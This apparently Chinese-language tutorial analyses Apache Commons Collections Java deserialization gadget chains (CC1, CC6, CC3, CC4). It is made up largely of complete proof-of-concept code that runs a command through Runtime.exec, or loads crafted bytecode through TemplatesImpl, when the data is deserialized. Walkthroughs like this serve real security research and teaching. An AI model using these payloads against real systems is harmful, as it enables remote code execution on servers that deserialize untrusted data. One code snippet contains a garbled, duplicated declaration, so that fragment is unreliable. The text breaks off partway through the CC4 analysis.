#### CC1链

##### 最终的Poc

    
    
    Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"open -a Calculator"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    
        HashMap<Object, Object> map = new HashMap<Object, Object>();
        map.put("value","value");
        Map<Object,Object> decorate = LazyMap.decorate(map, chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor con=c.getDeclaredConstructor(Class.class,Map.class);
        con.setAccessible(true);
    
    
        //这里new了一个动态代理 调用处理器的对象 然后给我们的memberValues他的值就给赋值上了 他的值就是decorate
        //也就是我们的Lazmap.decorate
        InvocationHandler annotationInvocationHandler=(InvocationHandler)con.newInstance(Target.class,decorate);
        Map  proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},annotationInvocationHandler);
    
    
        //这里是反序列化的代码 这里反序列化会调用代理类的代理方法 从而调用到我们的调用处理器的invoke方法
        Object obj=con.newInstance(Target.class,proxymap);
    
        serialize(obj);
        unserialize("ser.bin");
    
    
    }
    

##### 流程分析

我们首先来transformer接口,这里他接收一个对象，我们去找他的实现类。

![](./img/5289555745588235666.png)  
来到InvokerTransformer类，这个类实现了Transformer接口，并且他的transformer方法接口一个对象，并且进行了方法的调用。

我们可以看到这里getMethod方法中传入了两个参数，一个是方法名，一个是方法的参数，我们去查看这两个参数是否可控。

![](./img/6003950879038424285.png)  
在InvokerTransformer类中的构造器对iMethodName参数和iParamTypes参数进行了赋值。

![](./img/5279901078033432116.png)  
看到这里那么我们是不是可以利用InvokerTransformer类来执行命令。

    
    
    Runtime runtime = Runtime.getRuntime();
    InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"});
    invokerTransformer.transform(runtime);
    

![](./img/5076543452815516525.png)  
既然我们已经找到命令执行的地方了，那我们往上找那个不同类的方法调用了transformer方法

来到TransformerMap类的checkSetValue方法，这个方法调用了transform方法，这里我们去查看valueTransformer是否可控。

![](./img/8315268512817831957.png)  
可以看到这里通过构造器TransformedMap进行赋了值。

但是他的权限修饰符是protected的，所以我们不能直接调用。

![](./img/2034627152458338472.png)  
所以来到TransformedMap的decorate方法，他是static静态方法，所以是可以直接调用的。

这里去new了一个TransformedMap 将我们的valueTransformer传进去了

![](./img/9060683637889300043.png)  
到这里那我们是不是可以补充我们的链:

    
    
    Runtime runtime = Runtime.getRuntime();
            InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"});
    //        invokerTransformer.transform(runtime);
            HashMap hashMap = new HashMap();
            TransformedMap.decorate(hashMap,null,invokerTransformer);
    

那我们现在是不是要找那个类的那个方法调用了TransformerMap类的checkSetValue方法。

可以看到在MapEntry类的setValue方法 调用了checkSetValue，这里的parent是通过构造器MapEntry进行赋值的。

![](./img/819786548318989781.png)  
这里的话，他其实是重写了Entry的setValue方法，就是我们如果遍历被修饰过的Map，比如TransformedMap，他就会调用setvalue方法。

那么我们是不是就可以这样构造了:

首先遍历entry的话他会调用到setValue方法，之后我们传进去一个runtime，此时的parent使用在遍历TransformedMap的时候给他赋的值。之后再去调用checkSetValue方法将我们的runtime对象传递进去。

然后调用TransformedMap的checkSetValue方法，此时我们的代码中已经给valueTransformer赋值为了InvokerTransformer类

所以他会调用到InvokerTransformer类的transform方法将我们的runtime传递进去。

然后命令执行。

    
    
    Runtime runtime = Runtime.getRuntime();
            InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"});
    //        invokerTransformer.transform(runtime);
            HashMap hashMap = new HashMap();
            hashMap.put("aaa",invokerTransformer);
            Map<Object,Object> decorate = TransformedMap.decorate(hashMap, null, invokerTransformer);
    
     for (Map.Entry entry:decorate.entrySet()){
                entry.setValue(runtime);
    

继续往下走，我们去找不同类的那个方法调用了setValue方法，或者直接找那个类的readobject方法中调用了setValue方法。

来到AnnotationInvocationHandler类,这个类是一个动态代理处理器的类。

在他的readobject方法中调用了setValue方法，我们看memberValue是否是可控的。

![](./img/6399969266507651580.png)  
来到AnnotationInvocationHandler构造函数。

这里通过构造函数对memberValue进行了赋值，这里传进去两个参数，第一个参数是一个注解类型的，第二个就是我们的memberValue。

这个类不是public的，他是default类型的，只有在他的包底下，才能访问的到。所以这里需要通过反射进行获取

![](./img/8793716257927518138.png)  
那我们是不是可以将我们的poc改为:

    
    
    Runtime runtime = Runtime.getRuntime();
            InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"});
    //        invokerTransformer.transform(runtime);
            HashMap hashMap = new HashMap();
            hashMap.put("aaa",invokerTransformer);
            Map<Object,Object> decorate = TransformedMap.decorate(hashMap, null, invokerTransformer);
    
    //        for (Map.Entry entry:decorate.entrySet()){
    //            entry.setValue(runtime);
    //        }
            Class<?> forName = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor<?> annotation = forName.getDeclaredConstructor(Class.class, Map.class);
            annotation.setAccessible(true);
            Object o = annotation.newInstance(Override.class, decorate);
    

发现我们是执行不了的。

再次回到AnnotationInvocationHandler的readobject方法。

思考3个问题：

1.可以看到他传进去了一个AnnotationTypeMismatchExceptionProxy的对象，我们原本需要传进去进去一个Runtime的对象。

这里似乎好像我们控制不了。

2.Runtime对象是不能序列化的，他没有继承Serializable接口。

3.我们可以看到这里的readobject方法上面有两个if判断，我们需要绕过这两个if判断，然后才能执行。

![](./img/8000595079308698211.png)  
我们首先解决Runtime不能序列化的问题。

虽然Runtime是不可以序列化的，但是他的Class是可以序列化的，就是Runtime.class

那我们是不是可以通过反射获取到Runtime

    
    
    Class<Runtime> runtimeClass = Runtime.class;
    Method getRuntime = runtimeClass.getMethod("getRuntime", null);
    Runtime runtime = (Runtime) getRuntime.invoke(null, null);
    Method exec = runtimeClass.getMethod("exec", String.class);
    exec.invoke(runtime,"open -a Calculator");
    

![](./img/8993110860968725210.png)

然后我们将他改成InvokeTransformer版本

    
    
    Method getRuntimeMethod  = (Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
    Runtime r = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntimeMethod);
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"}).transform(r);
    

简单来解释一下这段代码的意思：

前面说到InvokerTransformer通过构造函数对methodName和paramTypes参数进行赋值之后调用transform方法执行。

这里我们可以理解为:第一次实例化InvokerTransformer类,将参数methodName赋值为了getMethod，将paramTypes赋值为了new
Class[]{String.class,Class[].class}，最后将args参数赋值为了getRuntime和null。args参数就相当于我们的反射调用invoke的第二个参数。

例如：这里的open -a Calculator 就好比args参数

    
    
    exec.invoke(runtime,"open -a Calculator");
    

然后调用我们的transformer方法。此时methodName和paramTypes以及args参数就有值了，这里将Runtime.class传递进去了。进行了反射的调用。

    
    
    Class cls = input.getClass();
    Method method = cls.getMethod(iMethodName, iParamTypes);
    return method.invoke(input, iArgs);
    

这里的代码就好比：

    
    
    Class cls = Runtime.getClass();
    Method method = cls.getMethod(getMethod,new Class[]{String.class,Class[].class} );
    return method.invoke(Runtime,new Object[]{"getRuntime",null} );
    

这里可以好好体会一下。

后面两个InvokerTransformer也是如此。

![](./img/7009609758373977891.png)  
我们发现这里是一个transformer的循环调用。

思考：我们能不能找一个循环调用transformer的类？答案是有的

我们找到ChainedTransformer的transformer方法

我们发现他的构造函数允许我们传入一个transformer的数组，然后调用他的transform方法进行循环调用。

![](./img/799921536467405907.png)  
那我们是不是可以这么构造？

    
    
    Transformer[] transformers=new Transformer[]{
            new InvokerTransformer("getMethod",
                    new Class[]{String.class,Class[].class},
                    new Object[]{"getRuntime",null}),
            new InvokerTransformer("invoke",
                    new Class[]{Object.class, Object[].class},
                    new Object[]{null, null}),
            new InvokerTransformer("exec",
                    new Class[]{String.class},
                    new Object[]{"open -a Calculator"})
    };
    
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    chainedTransformer.transform(Runtime.class);
    

![](./img/7532080290520532783.png)  
我们继续重新构造payload:

目前改成了这样，将我们的chainedTransformer传递进去，之前我们是直接传递的InvokerTransformer，将我们的chainedTransformer传递进去之后，就会循环调用。

但是发现是执行不了的？

我们上面还有两个问题，接下来需要解决这两个问题。

    
    
    Transformer[] transformers=new Transformer[]{
            new InvokerTransformer("getMethod",
                    new Class[]{String.class,Class[].class},
                    new Object[]{"getRuntime",null}),
            new InvokerTransformer("invoke",
                    new Class[]{Object.class, Object[].class},
                    new Object[]{null, null}),
            new InvokerTransformer("exec",
                    new Class[]{String.class},
                    new Object[]{"open -a Calculator"})
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    
            HashMap hashMap = new HashMap();
            hashMap.put("aaa","aaav");
            Map<Object,Object> decorate = TransformedMap.decorate(hashMap, null, chainedTransformer);
    
            Class<?> forName = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor<?> annotation = forName.getDeclaredConstructor(Class.class, Map.class);
            annotation.setAccessible(true);
            Object o = annotation.newInstance(Override.class, decorate);
    

这里我们进行调试：

首先调用getInstance方法传进去我们的type，就是Override.class，返回annotationType，

接着调用annotationType的memberTypes方法去获取成员方法。

![](./img/5692101712741026059.png)  
接着来到if判断

上面首先获取到memberValues键值对的key，接着调用memberTypes的get方法去查找这个key，memberTypes是我们查找成员方法的时候获取到的。在查找成员方法的时候是没有找到的。

所以他这里是查找不到的也就进入不到if判断。所以我们需要找到一个有成员方法的注解。

![](./img/449953369731573510.png)  
那我们的Retention.class 正好是合适的。或者 Target.class都是可以的。

![](./img/3234773010320796308.png)  
我们继续调试发现还是走不进去

这里他获取到key是我们Map的 "aaa"

这里他调用getKey方法获取到的是 "aaa"

然后调用memberTypes的get方法，从注解中去获取 "aaa"
这个参数。实际上我们的注解中只有value，是没有aaa的所以我们将Map的key改为value。

![](./img/8195319324854313460.png)  
改为value之后我们继续进行调试。

![](./img/3158248205037578624.png)  
此时是可以进去的

我们继续解决第一个问题。这里是不能控制的，怎么能让我们可以控制呢？

![](./img/8399126770395069757.png)  
此时引入另一个类：

ConstantTransformer类，这个类的transformer方法，你传进去什么他就给你返回什么。

![](./img/6967522831660682196.png)  
最终构造的payload

![](./img/2012218736688139154.png)  
反序列化成功：

![](./img/471094530220337869.png)

##### 简单小总结

1.首先反序列化他会调用AnnotationInvocationHandler类的readobject方法，他会调用到setValue方法，此时的memberValue是我们通过反射进行构造函数赋值为了TransformedMap

2.调用MapEntry的setValue方法，此时的parent是transformMap，接着调用到transformMap的checkSetValue方法

3.接着调用transform方法，此时的valueTransformer是我们通过调用transformMap类的静态方法decorate进行了赋值。赋值为了chainedTransformer

4.接着循环在chainedTransformer类中循环调用transformer方法

4.最后到命令执行。

#### CC1(Ysoserial中的CC1)

##### 最终的POC

    
    
    Transformer[] transformers=new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",
                            new Class[]{String.class,Class[].class},
                            new Object[]{"getRuntime",null}),
                    new InvokerTransformer("invoke",
                            new Class[]{Object.class, Object[].class},
                            new Object[]{null, null}),
                    new InvokerTransformer("exec",
                            new Class[]{String.class},
                            new Object[]{"open -a Calculator"})
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    
            HashMap<Object,Object> map = new HashMap<Object,Object>();
            Map lazyMap = LazyMap.decorate(map,chainedTransformer);
            Class<?> forName = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor<?> annotation = forName.getDeclaredConstructor(Class.class, Map.class);
            annotation.setAccessible(true);
            InvocationHandler h = (InvocationHandler) annotation.newInstance(Override.class, lazyMap);
    
            Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h);
    
            Object o = annotation.newInstance(Override.class,mapProxy);
    

##### 流程分析

我们发现在Ysoserial中跟我们上面分析的CC1是差不多的。

后面其实都是一样的。

这里我们将之前在Map.Entry中的setValue方法改为了调用LazyMap的get方法

这里也是调用了transform方法。

![](./img/4363090629835643735.png)  
他的factory是可控的，是可以通过LazyMap的decorate静态方法传递进去。并且他传进去一个Map，我们看上面的if判断，判断我们这个map里面是否有这个key，如果有的话那么直接返回，所以我们需要确保他是没有这个key的。

![](./img/411068504686935625.png)  
接下来我们需要找到哪里调用了lazymap的get方法。

来到我们刚才分析的AnnotationInvocationHandler类中的invoke方法。

这里调用了memberValues的get方法，memberValues是我们可控的，我们可以反射实例化他的构造函数进行赋值。

![](./img/2201879228145182128.png)  
这里的AnnotationInvocationHandler是一个调用处理器类，他的invoke方法什么时候会调用呢？

只要外面有方法调用他就会调用他的invoke方法。

这里我们需要创建一个调用处理器，当执行我们代理的接口的方法的时候，他就会执行调用处理器的invoke方法

    
    
    Class<?> forName = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor<?> annotation = forName.getDeclaredConstructor(Class.class, Map.class);
    annotation.setAccessible(true);
    InvocationHandler h = (InvocationHandler) annotation.newInstance(Override.class, lazyMap);
    

接着创建一个动态代理类使用jdk内置的Proxy类，这里简单理解一下这三个参数。

第一个参数:类加载器，在内存中生成字节码也是class文件，要执行也得先加载到内存中，所以需要类加载器，并且jdk要求，目标类的加载器，必须和代理类的加载器使用的是同一个。

第二个参数：在内存中生成代理类的时候，这个代理类是需要你告诉它实现那些接口的。

第三个参数: 调用处理器，当我们执行代理类的方法时，就会执行调用处理器的invoke方法。

    
    
    Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h);
    

例如:

![](./img/6792029079088382441.png)  
之后我们通过反序列化进行调用的时候，他会执行invoke方法，从而导致反序列化漏洞触发。

![](./img/8038041653500472129.png)  
可以看到他这里会调用entrySet方法 他并需要走到下面的if，所以我们的注解不需要指定为上面的，比如Target.class等等。

#### CC6链

##### 最终的POC

    
    
    Transformer[] transformers=new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                    new Class[]{String.class,Class[].class},
                    new Object[]{"getRuntime",null}),
            new InvokerTransformer("invoke",
                    new Class[]{Object.class, Object[].class},
                    new Object[]{null, null}),
            new InvokerTransformer("exec",
                    new Class[]{String.class},
                    new Object[]{"open -a Calculator"})
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
            HashMap<Object,Object> map = new HashMap<Object,Object>();
            Map lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));
            TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"aaa");
            HashMap<Object,Object> map2 = new HashMap<Object,Object>();
            map2.put(tiedMapEntry,"bbbb");
            lazyMap.remove("aaa");
    Class<?> clazz =  LazyMap.class;
            Field fieldfactory = clazz.getDeclaredField("factory");
            fieldfactory.setAccessible(true);
            fieldfactory.set(lazyMap,chainedTransformer);
            //这里我们发现在我们序列化的时候 他就直接直接执行了 这是因为最后我们进入到LazyMap中的时候 他就直接调用了transformer方法
            serialize(map2);
            unserialize("ser.bin");
    

##### 流程分析

后面还是的命令执行还是跟CC1是一样的。

前面通过HashMap的readobject调用到hashcode方法，那个类的hashcode方法调用到了lazymap的get方法。

首先我们需要找到那个类的hashcode方法中调用了get方法。

这里找到了TiedMapEntry的hashcode方法中调用了getValue方法

![](./img/6495838113745363550.png)  
在getValue方法中又调用了get方法。

这里的map我们是可控的，可以通过TiedMapEntry的构造函数进行赋值。我们可以将map赋值为lazyMap，他就会调用到lazyMap的get方法。

![](./img/8761122433828698478.png)  
那么我们构造出来的payload是不是这样的?

    
    
    Transformer[] transformers=new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",
                            new Class[]{String.class,Class[].class},
                            new Object[]{"getRuntime",null}),
                    new InvokerTransformer("invoke",
                            new Class[]{Object.class, Object[].class},
                            new Object[]{null, null}),
                    new InvokerTransformer("exec",
                            new Class[]{String.class},
                            new Object[]{"open -a Calculator"})
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
            HashMap<Object,Object> map = new HashMap<Object,Object>();
            Map lazyMap = LazyMap.decorate(map,chainedTransformer);
            TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"aaa");
    
            HashMap<Object, Object> map2 = new HashMap<>();
            map2.put(tiedMapEntry,"bbb");
    
            serialize(map2);
    //        unserialize("ser.bin");
    

我们发现在序列化的时候他就直接执行了。这是为什么呢？

![](./img/3949404571545817562.png)  
因为我们在map2.put的时候他调用了hash方法。

![](./img/2026617268127872561.png)  
我们得在put的时候让他不能触发这条链,我们可以将transformer改成空的，也可以在调用lazymap.decorate方法的时候给他传进去一个ConstantTransformer类

最后当我们put完之后再给他改回来。

例如:

![](./img/3562308914062786185.png)

    
    
    Class<?> clazz =  LazyMap.class;
    Field fieldfactory = clazz.getDeclaredField("factory");
    fieldfactory.setAccessible(true);
    fieldfactory.set(lazyMap,chainedTransformer);
    

此时我们在序列化的时候他就不会执行了。

但是我们在反序列化的时候他也没有执行.....

因为我们在put的时候会给他添加一个key。

所以我们需要在他put完之后给他删了。

此时就可以反序列化成功了。

![](./img/3337639810261550124.png)

#### CC链3

##### 最终的poc

    
    
    TemplatesImpl templates = new TemplatesImpl();
            Class tc = templates.getClass();
            Field name = tc.getDeclaredField("_name");
            name.setAccessible(true);
            name.set(templates,"aaaaaa");
            Field bytecodes = tc.getDeclaredField("_bytecodes");
            bytecodes.setAccessible(true);
            byte[] code = Files.readAllBytes(Paths.get("/Users/relay/Documents/spring5MVC/Collections1/target/classes/Test.class"));
            byte[][] codes = {code};
            bytecodes.set(templates,codes);
    
            Field tfactory = tc.getDeclaredField("_tfactory");
            tfactory.setAccessible(true);
            tfactory.set(templates,new TransformerFactoryImpl());
    //        templates.newTransformer();
    
    
            Transformer[] transformers=new Transformer[]{
                    new ConstantTransformer(templates),
                    new InvokerTransformer("newTransformer",
                            null,
                           null)
            };
    
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    //        chainedTransformer.transform(templates);
    
            HashMap hashMap = new HashMap();
            hashMap.put("value","aaav");
            Map<Object,Object> decorate = TransformedMap.decorate(hashMap, null, chainedTransformer);
    
            Class<?> forName = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor<?> annotation = forName.getDeclaredConstructor(Class.class, Map.class);
            annotation.setAccessible(true);
            Object o = annotation.newInstance(Retention.class, decorate);
    
            serialize(o);
            unserialize("ser.bin");
    

##### 流程分析

CC3这条链使用了类加载机制，我们都知道在类加载的时候，他是不会执行代码的，只有在初始化的时候他才会执行。

那我们是不是就需要一个初始化的地方呢？

那我们就需要去找那个类重写了defineClass方法，需要是public的。

最终在TemplatesImpl类中找到了一个权限为default的defineclass，也就是说只能他这个包里面才能调用。

![](./img/7351271295548406933.png)  
我们去看这个包调用了这个defineClass

可以看到在他自己包下的defineTransletClasses方法调用了defineclass方法，但是他的方法是私有的，所以我们需要去找哪里调用了defineTransletClasses。

![](./img/6600494832168236753.png)  
在同样包下的有3处调用了defineTransletClasses方法，但是有两个是私有属性的，只有一个是public的。虽然是public的，但是他对于_class是没有后续操作的，因为我们需要初始化才可以执行代码。

![](./img/3323678523710338903.png)

所以我们来到getTransletInstance方法，这是一个私有方法，但是下面对_Class进行了初始化。

![](./img/8741066817125348652.png)

那我们就需要找哪里调用了getTransletInstance方法。

这里我们找到了他的newTransformer方法，他的权限修饰符是public的，我们是直接可以调用的。并且调用了getTransletInstance方法

![](./img/4658223702164190633.png)  
找到这里基本上这条这条链就结束了。

    
    
    defineClass() --> defineTransletClasses() --> getTransletInstance() --> newTransformer()
    

接下来我们去看一下整个代码的逻辑

首先从newTransformer入口开始。

这里有这几个值_outputProperties _indentNumber _tfactory
这三个值在目前看来是不需要赋值的，就算不赋值也是可以调用到getTransletInstance方法的。

![](./img/3048862665388023579.png)  
我们来到getTransletInstance方法。

在这里他有两个判断_name 如果为null的话，他就直接return
null了，所以我们不能让他为null，_class如果为null的话，他就会走到defineTransletClasses方法，所以_class我们不需要给他赋值。

![](./img/3597956231274450815.png)  
来到defineTransletClasses方法。

这里判断如果_bytecodes为null的话，他就直接抛出异常。所以__bytecode需要赋值。我们注意到_tfactory，他是要调用方法的，所以他也需要赋值。

![](./img/2816689797917232200.png)  
那我们的payload是不是可以暂时写成这样? 通过反射修改这几个属性。

这里的codes需要赋什么值？

    
    
    TemplatesImpl templates = new TemplatesImpl();
    Class<? extends TemplatesImpl> templatesClass = templates.getClass();
    Field name = templatesClass.getDeclaredField("_name");
    name.setAccessible(true);
    name.set(templates,"aaa");
    Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
    bytecodes.setAccessible(true);
    bytecodes.set(templates,codes);
    

我们来到defineClass方法

这里他的参数是一个一维的byte数组。

![](./img/3258397884811776277.png)  
defineClass是在defineTransletClasses方法的for循环中调用的。

![](./img/4574473068600758392.png)  
所以我们是不是可以创建一个类文件，在静态代码块中写入我们的恶意代码。然后javac编译成class字节码，最后通过Files进行读取？

创建一个Test.java，然后javac编译。

![](./img/8214458574143201614.png)  
那我们的_bytecodes是不是可以通过Files读取出来？

    
    
    TemplatesImpl templates = new TemplatesImpl();
    Class<? extends TemplatesImpl> templatesClass = templates.getClass();
    Field name = templatesClass.getDeclaredField("_name");
    name.setAccessible(true);
    name.set(templates,"aaa");
    Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
    bytecodes.setAccessible(true);
    byte[] code = Files.readAllBytes(Paths.get("/Users/relay/Documents/spring5MVC/Collections1/src/main/java/Test.class"));
    byte[][] codes = {code};
    bytecodes.set(templates,codes);
    

接下来我们还需要给_tfactory进行赋值，因为如果不给他赋值的话，他调用方法的时候会报空指针异常的。

_tfactory是TransformerFactoryImpl类型的。他是不能被序列化的。我们直接给他赋值是没用的，在反序列化的时候值是传不进去的。

![](./img/6008680697649958044.png)  
我们先看一下效果。

可以发现这里报了空指针的异常。

![](./img/2998625965795259529.png)  
我们进行调试。

可以清楚的看到我们的类已经加载了，但是下面还有两个判断就是说我们加载的类他的父类是不是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet这个类。

如果不是的话他就会报空指针异常，因为_auxClasses是没有给他赋值的，现在我们要么让我们的恶意类去继承com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet类，要么我们去给_auxClasses进行赋值。

但是下面判断说如果_transletIndex < 0 的话，那么就会抛出异常，所以我们选择第一种方式。

![](./img/7513415991115364853.png)

继承com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet类并且实现它的方法。然后编译。

![](./img/290679246626022179.png)  
再次执行发现是可以执行的。

![](./img/5031539630894757571.png)  
我们后半段已经构造成功了

再次将我们CC1的这条链前半部分拿过来。

我们将他稍微改一下即可,让他进行反射调用即可。这里跟cc1是道理是一样的，也是循环去调用transformer，然后通过反射进行调用。

    
    
    Transformer[] transformers=new Transformer[]n  Transformer[] transformers=new Transformer[]那个{
                    new ConstantTransformer(templates),
                    new InvokerTransformer("newTransformer",
                            null,
                           null)
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
            chainedTransformer.transform(templates);
    

![](./img/9126701369811187310.png)  
这样的话我们就可以把CC1的拿过来就可以了。

    
    
    HashMap hashMap = new HashMap();
    hashMap.put("value","aaav");
    Map<Object,Object> decorate = TransformedMap.decorate(hashMap, null, chainedTransformer);
    
    Class<?> forName = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor<?> annotation = forName.getDeclaredConstructor(Class.class, Map.class);
    annotation.setAccessible(true);
    Object o = annotation.newInstance(Retention.class, decorate);
    
    serialize(o);
    unserialize("ser.bin");
    

这样的话就是我们就光改了执行命令的地方。

![](./img/1344247431670336996.png)  
那我们是不是也可以将cc6的那本部分拿过来。也是没有问题的

    
    
    HashMap<Object,Object> map = new HashMap<Object,Object>();
    Map lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));
    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"aaa");
    
    HashMap<Object, Object> map2 = new HashMap<>();
    map2.put(tiedMapEntry,"bbb");
    
    lazyMap.remove("aaa");
    
    
    Class<?> clazz =  LazyMap.class;
    Field fieldfactory = clazz.getDeclaredField("factory");
    fieldfactory.setAccessible(true);
    fieldfactory.set(lazyMap,chainedTransformer);
    
    
    serialize(map2);
    unserialize("ser.bin");
    

![](./img/5252509057429094441.png)

#### CC3链(Ysoserial中的CC3)

##### 最终payload

##### 流程分析

我们知道CC3中是可以通过newTransformer进行执行代码的。

我们继续往上找看哪里调用了newTransformer。

我们可以看到在TrAXFilter类中的构造函数里面对_templates进行了赋值并且调用了他的newTransformer方法

![](./img/4357098967839721669.png)  
CC3的作者找到了InstantiateTransformer类，在这个类中他的transformer方法首先判断传进来的参数是不是class类型
如果是的话进行实例化。

![](./img/935149422241812061.png)  
那我们是不是可以这样构造？

这里通过调用InstantiateTransformer类的transform方法，transform方法又调用了TrAXFilter类的构造方法方法

此时传过去的iArgs就是我们的templates，接着调用到我们TemplatesImpl类的newtransformer方法从而触发。我们后面就不需要使用到invokeTransformer来执行了。

    
    
    TemplatesImpl templates = new TemplatesImpl();
    Class tc = templates.getClass();
    Field name = tc.getDeclaredField("_name");
    name.setAccessible(true);
    name.set(templates,"aaaaaa");
    Field bytecodes = tc.getDeclaredField("_bytecodes");
    bytecodes.setAccessible(true);
    byte[] code = Files.readAllBytes(Paths.get("/Users/relay/Documents/spring5MVC/Collections1/target/classes/Test.class"));
    byte[][] codes = {code};
    bytecodes.set(templates,codes);
    
    Field tfactory = tc.getDeclaredField("_tfactory");
    tfactory.setAccessible(true);
    tfactory.set(templates,new TransformerFactoryImpl());
     InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
    
    instantiateTransformer.transform(TrAXFilter.class);
    

![](./img/1663535178894835128.png)  
那我们集合cc1是不是可以这样构造？

    
    
    TemplatesImpl templates = new TemplatesImpl();
            Class tc = templates.getClass();
            Field name = tc.getDeclaredField("_name");
            name.setAccessible(true);
            name.set(templates,"aaaaaa");
            Field bytecodes = tc.getDeclaredField("_bytecodes");
            bytecodes.setAccessible(true);
            byte[] code = Files.readAllBytes(Paths.get("/Users/relay/Documents/spring5MVC/Collections1/target/classes/Test.class"));
            byte[][] codes = {code};
            bytecodes.set(templates,codes);
    
            Field tfactory = tc.getDeclaredField("_tfactory");
            tfactory.setAccessible(true);
            tfactory.set(templates,new TransformerFactoryImpl());
    //        templates.newTransformer();
    
            InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
    
            Transformer[] transformers=new Transformer[]{
                    new ConstantTransformer(TrAXFilter.class),
                    instantiateTransformer
            };
    //
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    
    HashMap<Object,Object> map = new HashMap<Object,Object>();
            Map lazyMap = LazyMap.decorate(map,chainedTransformer);
            Class<?> forName = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor<?> annotation = forName.getDeclaredConstructor(Class.class, Map.class);
            annotation.setAccessible(true);
            InvocationHandler h = (InvocationHandler) annotation.newInstance(Override.class, lazyMap);
    
            Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h);
    
    //        mapProxy.entrySet();
            Object o = annotation.newInstance(Override.class,mapProxy);
            serialize(o);
            unserialize("ser.bin");
    

![](./img/5950069404830273142.png)

#### CC4链

##### 最终payload

    
    
    TemplatesImpl templates = new TemplatesImpl();
            Class tc = templates.getClass();
            Field name = tc.getDeclaredField("_name");
            name.setAccessible(true);
            name.set(templates,"aaaaaa");
            Field bytecodes = tc.getDeclaredField("_bytecodes");
            bytecodes.setAccessible(true);
            byte[] code = Files.readAllBytes(Paths.get("/Users/relay/Documents/spring5MVC/Collections1/target/classes/Test.class"));
            byte[][] codes = {code};
            bytecodes.set(templates,codes);
    
            Field tfactory = tc.getDeclaredField("_tfactory");
            tfactory.setAccessible(true);
            tfactory.set(templates,new TransformerFactoryImpl());
    //        templates.newTransformer();
    
            InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
    
            Transformer[] transformers=new Transformer[]{
                    new ConstantTransformer(TrAXFilter.class),
                    instantiateTransformer
            };
    //
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    
            TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
    
            PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
            priorityQueue.add("aaaa");
            priorityQueue.add("vvv");
            serialize(priorityQueue);
            unserialize("ser.bin");
    

##### 流程分析

CC4的漏洞版本是collections4

    
    
    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-collections4</artifactId>
        <version>4.0</version>
    </dependency>
    

CC4跟前面几个cc链是差不多的还是换汤不换药，最后还是到invoketransformer去执行的命令。

那我们就去找哪里调用了transformer

这里找到了一个在TransformingComparator类的compare方法调用了transformer方法

![](./img/7441485549280832148.png)  
所以我们需要再往回找哪里调用了compare方法

在优先队列PriorityQueue类中的
siftDownUsingComparator方法中调用了compare方法,我们继续往上找看哪里调用了siftDownUsingComparator方法。

![](./img/4206415402990537803.png)  
来到siftDown方法，在siftDown方法中调用了siftDownUsingComparator方法

